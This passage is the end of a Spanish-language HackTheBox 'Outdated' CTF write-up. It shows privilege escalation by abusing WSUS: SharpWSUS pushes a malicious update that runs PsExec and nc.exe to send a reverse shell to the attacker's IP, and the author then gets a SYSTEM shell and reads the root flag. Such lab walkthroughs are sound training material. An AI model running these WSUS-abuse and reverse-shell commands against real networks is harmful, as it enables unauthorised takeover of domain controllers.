</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>[*] Locate complete</span></span></code></pre></div>
<p>El segundo paso sería inspeccionar para ver que equipos tenemos a nuestro alcance para poder hacer el movimiento lateral, en este caso sabemos que nuestro &ldquo;target&rdquo; es dc.outdated.htb</p>
<p>Parece ser que WSUS solo confía de binarios firmados por Microsoft, así que podemos utilizar <code>PsExec64.exe</code> para poder ejecutar nuestro comando deseado.</p>
<p>Sabiendo esto, podemos crear una tarea de actualización para que se nos mande una reverse shell a nuestra IP.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>.<span style="color:#0ff;font-weight:bold">\S</span>harpWSUS.exe create /payload:<span style="color:#0ff;font-weight:bold">&#34;C:\ProgramData\ps.exe&#34;</span> /args:<span style="color:#0ff;font-weight:bold">&#34; -accepteula -s -d C:\ProgramData\nc.exe -e cmd.exe 10.10.14.125 443&#34;</span> /title:<span style="color:#0ff;font-weight:bold">&#34;pwnedbypointed&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>*] Action: Create Update                                                                                                                                     
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>[*] Creating patch to use the following:                                                                                                                      
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>[*] Payload: ps.exe                                                                                                                                           
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>[*] Payload Path: C:<span style="color:#0ff;font-weight:bold">\P</span>rogramData<span style="color:#0ff;font-weight:bold">\p</span>s.exe                                                                                                                       
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>[*] Arguments:  -accepteula -s -d C:<span style="color:#0ff;font-weight:bold">\P</span>rogramData<span style="color:#0ff;font-weight:bold">\n</span>c.exe -e cmd.exe 10.10.14.125 <span style="color:#ff0;font-weight:bold">443</span>                                                                           
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>[*] Arguments (HTML Encoded):  -accepteula -s -d C:<span style="color:#0ff;font-weight:bold">\P</span>rogramData<span style="color:#0ff;font-weight:bold">\n</span>c.exe -e cmd.exe 10.10.14.125 <span style="color:#ff0;font-weight:bold">443</span>                                                            
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>                                                                                                                                                              
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#007f7f">################# WSUS Server Enumeration via SQL ##################                                                                                          </span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>ServerName, WSUSPortNumber, WSUSContentLocation                                                                                                               
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>-----------------------------------------------                                                                                                               
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>DC, 8530, c:<span style="color:#0ff;font-weight:bold">\W</span>SUS<span style="color:#0ff;font-weight:bold">\W</span>susContent                                                                                                                                 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>                                                                                          
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>ImportUpdate                                                                              
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>Update Revision ID: <span style="color:#ff0;font-weight:bold">46</span>                                                                    
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>PrepareXMLtoClient                                                                        
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>InjectURL2Download                                                                        
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>DeploymentRevision                                                                        
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>PrepareBundle                                                                             
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>PrepareBundle Revision ID: <span style="color:#ff0;font-weight:bold">47</span>                                                             
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>PrepareXMLBundletoClient                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>DeploymentRevision                                                                        
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>                                                                                          
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>[*] Update created - When ready to deploy use the following command:                      
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>[*] SharpWSUS.exe approve /updateid:c8cc30c0-30dc-44d3-b583-c2efe3e30535 /computername:Target.FQDN /groupname:<span style="color:#0ff;font-weight:bold">&#34;Group Name&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>                                                                                          
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>[*] To check on the update status use the following command:                              
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>[*] SharpWSUS.exe check /updateid:c8cc30c0-30dc-44d3-b583-c2efe3e30535 /computername:Target.FQDN                                        
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>                                                                                                                
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>[*] To delete the update use the following command:                                            
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>[*] SharpWSUS.exe delete /updateid:c8cc30c0-30dc-44d3-b583-c2efe3e30535 /computername:Target.FQDN /groupname:<span style="color:#0ff;font-weight:bold">&#34;Group Name&#34;</span>                                                                     
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>[*] Create complete</span></span></code></pre></div>
<p>Ahora solo hay que aprobar la actualización para desplegarla en <code>dc.outdated.htb</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>*Evil-WinRM* PS C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\s</span>flowers<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt; .<span style="color:#0ff;font-weight:bold">\S</span>harpWSUS.exe approve /updateid:c8cc30c0-30dc-44d3-b583-c2efe3e30535 /computername:dc.outdated.htb /groupname:<span style="color:#0ff;font-weight:bold">&#34;pwneeedhahaha&#34;</span>          
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> ____  _                   __        ______  _   _ ____
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>/ ___|| |__   __ _ _ __ _ _<span style="color:#0ff;font-weight:bold">\ \ </span>     / / ___|| | | / ___|
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#0ff;font-weight:bold">\_</span>__ <span style="color:#0ff;font-weight:bold">\|</span> <span style="color:#0ff;font-weight:bold">&#39;_ \ / _` | &#39;</span>__| <span style="color:#f00">&#39;</span>_ <span style="color:#0ff;font-weight:bold">\ \ </span>/<span style="color:#0ff;font-weight:bold">\ </span>/ /<span style="color:#0ff;font-weight:bold">\_</span>__ <span style="color:#0ff;font-weight:bold">\|</span> | | <span style="color:#0ff;font-weight:bold">\_</span>__ <span style="color:#0ff;font-weight:bold">\
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#0ff;font-weight:bold"></span> ___) | | | | (_| | |  | |_) <span style="color:#0ff;font-weight:bold">\ </span>V  V /  ___) | |_| |___) |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>|____/|_| |_|<span style="color:#0ff;font-weight:bold">\_</span>_,_|_|  | .__/ <span style="color:#0ff;font-weight:bold">\_</span>/<span style="color:#0ff;font-weight:bold">\_</span>/  |____/ <span style="color:#0ff;font-weight:bold">\_</span>__/|____/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>                       |_|
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>           Phil Keeble @ Nettitude Red Team
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>[*] Action: Approve Update
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>Targeting dc.outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>TargetComputer, ComputerID, TargetID
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>------------------------------------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, <span style="color:#ff0;font-weight:bold">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>Group Exists = False
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>Group Created: pwneeedhahaha
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>Added Computer To Group
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>Approved Update
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>[*] Approve complete</span></span></code></pre></div>
<p>Y ahora si nos ponemos en escucha&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.125] from (UNKNOWN) [10.129.229.239] <span style="color:#ff0;font-weight:bold">50069</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Microsoft Windows [Version 10.0.17763.1432]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>(c) <span style="color:#ff0;font-weight:bold">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>C:<span style="color:#0ff;font-weight:bold">\W</span>indows<span style="color:#0ff;font-weight:bold">\s</span>ystem32&gt;whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>nt authority<span style="color:#0ff;font-weight:bold">\s</span>ystem</span></span></code></pre></div>
<p>Podemos leer la flag de <code>root</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\A</span>dministrator<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt;type root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#fff;font-weight:bold">type</span> root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>ed306fa59ff2e6c...</span></span></code></pre></div>
<p>Happy Hacking! 🚀</p>

  </content>
  <p>
    
      <a href="/tags/hackthebox/">#HackTheBox</a>&nbsp;&nbsp;
    
      <a href="/tags/outdated/">#Outdated</a>&nbsp;&nbsp;
    
      <a href="/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
    
      <a href="/tags/cybersecurity/">#Cybersecurity</a>&nbsp;&nbsp;
    
      <a href="/tags/penetration-testing/">#Penetration Testing</a>&nbsp;&nbsp;
    
      <a href="/tags/ctf/">#CTF</a>&nbsp;&nbsp;
    
      <a href="/tags/reverse-shell/">#Reverse Shell</a>&nbsp;&nbsp;
    
      <a href="/tags/rce/">#RCE</a>&nbsp;&nbsp;
    
      <a href="/tags/exploit/">#Exploit</a>&nbsp;&nbsp;
    
      <a href="/tags/windows/">#Windows</a>&nbsp;&nbsp;
    
      <a href="/tags/smb-enumeration/">#SMB Enumeration</a>&nbsp;&nbsp;
    
      <a href="/tags/cve-2022-30190/">#CVE-2022-30190</a>&nbsp;&nbsp;
    
      <a href="/tags/follina/">#Follina</a>&nbsp;&nbsp;
    
      <a href="/tags/bloodhound/">#Bloodhound</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-addkeycredentiallink/">#Abusing AddKeyCredentialLink</a>&nbsp;&nbsp;
    
      <a href="/tags/writing-msds-keycredentiallink/">#Writing MsDS-KeyCredentialLink</a>&nbsp;&nbsp;
    
      <a href="/tags/user-pivoting/">#User Pivoting</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-wsus/">#Abusing WSUS</a>&nbsp;&nbsp;
    
      <a href="/tags/privilege-escalation/">#Privilege Escalation</a>&nbsp;&nbsp;
    
  </p>

    </main>
    <footer>
      
  <span>© 2024 pointedsec</span>



    </footer>

    
</body>
</html>
